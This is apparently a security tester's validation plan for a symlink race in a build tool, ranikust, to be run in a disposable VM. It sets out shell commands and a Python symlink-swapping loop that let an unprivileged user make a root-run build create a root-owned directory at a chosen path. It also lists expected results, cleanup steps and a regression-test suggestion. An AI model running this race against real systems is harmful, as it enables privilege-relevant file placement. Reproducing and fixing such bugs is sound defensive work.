validation_plan.local:
In the disposable VM only (just test-vm, tier T2), as root with dummy data. Step A, the kernel fact without ranikust: for v in 0 1: sysctl -w fs.protected_symlinks=$v; useradd -m rnkrace (once); install -d -m 0755 /srv/rnk-target; as rnkrace: ln -s /srv/rnk-target /tmp/rnk-pre; as root: mkdir /tmp/rnk-pre/state; echo rc=$?; ls -ld /srv/rnk-target/state; stat -L /tmp/rnk-pre >/dev/null; echo stat_rc=$?; then rm -f /tmp/rnk-pre; rmdir /srv/rnk-target/state. Expected per the source reading: mkdir succeeds and creates /srv/rnk-target/state under both values (protected_symlinks restricts trailing symlinks only), while stat -L (the trailing follow std's is_dir() makes) fails with EACCES under 1 and succeeds under 0. Step B, the race through ranikust: keep fs.protected_symlinks=1; make /ctx with a trivial Dockerfile (FROM scratch); as rnkrace, run for at most 60 s a tight loop that alternates symlink and unlink of /tmp/rnk-race -> /srv/rnk-target (timeout 60 python3 -c 'import os
while 1:
  try: os.symlink("/srv/rnk-target","/tmp/rnk-race")
  except OSError: pass
  try: os.unlink("/tmp/rnk-race")
  except OSError: pass', or a shell loop if python3 is absent). As root, up to 300 iterations: if /tmp/rnk-race is a real directory, rm -rf --one-file-system /tmp/rnk-race; timeout 30 "$RNK" --context /ctx --no-push --state-dir /tmp/rnk-race/state; then test -d /srv/rnk-target/state && stat -c '%U %a' /srv/rnk-target/state && break. Vulnerable result: /srv/rnk-target/state exists, owned by root, mode 700, after a run refused with 'cannot open /tmp/rnk-race/state as a directory without following a symlink'. Safe result: /srv/rnk-target stays empty for all iterations. Stop at the first directory; then kill the loop, remove /tmp/rnk-race, /srv/rnk-target and the user. A deterministic alternative is a T0 test that plants the symlink from a test-only hook between the scan and the create, if the maintainer adds one; the fix's regression test should do that.
